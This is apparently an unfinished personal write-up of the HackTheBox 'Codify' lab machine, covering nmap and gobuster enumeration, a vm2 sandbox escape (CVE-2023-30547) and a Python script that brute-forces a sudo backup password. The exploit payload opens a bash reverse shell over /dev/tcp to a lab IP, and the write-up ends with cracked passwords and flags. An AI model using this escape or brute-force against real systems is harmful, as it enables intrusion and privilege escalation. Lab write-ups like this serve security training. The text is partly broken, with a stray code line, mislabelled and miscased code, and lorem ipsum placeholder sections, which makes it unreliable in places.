---
aliases:
  - Codify
Date: 2024-02-27
Platform: HackTheBox
Category: Machine
Difficulty: Easy
tags:
  - Linux
  - apport-cli
  - Easy
  - HackTheBox
  - Joomla
Status: 
IP: 10.10.11.239
---

# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- nmap
- gobuster

---

# Information Gathering

Scanned **ports** using nmap:
```bash
┌─[root@parrot]─[/home/systemerror/HTB/Codify]
└──╼ #nmap -sC -sV 10.10.11.239
Starting Nmap 7.93 ( https://nmap.org ) at 2024-02-27 23:58 CET
Nmap scan report for 10.10.11.239
Host is up (0.039s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96071cc6773e07a0cc6f2419744d570b (ECDSA)
|_  256 0ba4c0cfe23b95aef6f5df7d0c88d6ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds

```


---

# Enumeration Web
Nothing of interest for the **enumeration of directory**
```bash
┌─[root@parrot]─[/home/systemerror/HTB/Codify]
└──╼ #gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://codify.htb
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://codify.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2024/02/28 00:08:05 Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 2921]
/About                (Status: 200) [Size: 2921]
/editor               (Status: 200) [Size: 3123]
/Editor               (Status: 200) [Size: 3123]
/ABOUT                (Status: 200) [Size: 2921]
                                                
===============================================================
2024/02/28 00:16:37 Finished
===============================================================


```
---

# Exploitation
## vm2 Package

This website use the **vm2** package, to check the version of this package we can see the package.config in the [git repository](https://github.com/patriksimek/vm2/releases/tag/3.9.16)

![[Pasted image 20240229214839.png]]

Package.config


```json
{
  "author": {
    "name": "Patrik Simek",
    "url": "https://patriksimek.cz"
  },
  "name": "vm2",
  "description": "vm2 is a sandbox that can run untrusted code with whitelisted Node's built-in modules. Securely!",
  "keywords": [
    "sandbox",
    "prison",
    "jail",
    "vm",
    "alcatraz",
    "contextify"
  ],
  "version": "3.9.16",
  "main": "index.js",
  "sideEffects": false,
  "repository": "github:patriksimek/vm2",
  "license": "MIT",
  "dependencies": {
    "acorn": "^8.7.0",
    "acorn-walk": "^8.2.0"
  },
  "devDependencies": {
    "eslint": "^5.16.0",
    "eslint-config-integromat": "^1.5.0",
    "mocha": "^6.2.2"
  },
  "engines": {
    "node": ">=6.0"
  },
  "scripts": {
    "test": "mocha test",
    "pretest": "eslint ."
  },
  "bin": {
    "vm2": "./bin/vm2"
  },
  "types": "index.d.ts"
}
```

Or  for check if this machine is vulnerable run this command
```js
const version = require("vm2/package.json").version;

if (version < "3.9.17") {
    console.log("vulnerable!");
} else {
    console.log("not vulnerable");
}
```


This version is vulnerable of the  [CVE-2023-30547](https://github.com/advisories/GHSA-ch3r-j5x3-6q2m).


"bash -c 'exec bash -i &>/dev/tcp/10.10.16.104/4242 <&1'").ToString();
const {VM} = require("vm2");
const vm = new VM();

``` json
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync("bash -c 'exec bash -i &>/dev/tcp/10.10.16.104/4242 <&1'").ToString();
}
`

console.log(vm.run(code));
```



#john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt

-rwxr-xr-x 1 root root 928 Nov  2 12:26 /opt/scripts/mysql-backup.sh

mysql use the charater * this confimerd password


``` python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```


sudo su-

---

# Lateral Movement to user
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Lateral Movement vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Privilege Escalation
## Local Enumeration
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

## Privilege Escalation vector
Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.

---

# Trophy & Loot

## Credentials

| User   | Password              |
| ------ | --------------------- |
| joshua | spongebob1            |
| root   | kljh12k3jhaskjh12kjh3 |


## Flags

| User         | Flag                             |
| ------------ | -------------------------------- |
| user.txt<br> | 2acb1580783ecca533463eb310e372fa |
| root.txt     | cbebd46886f52c7ff0cbacf7ae804e25 |
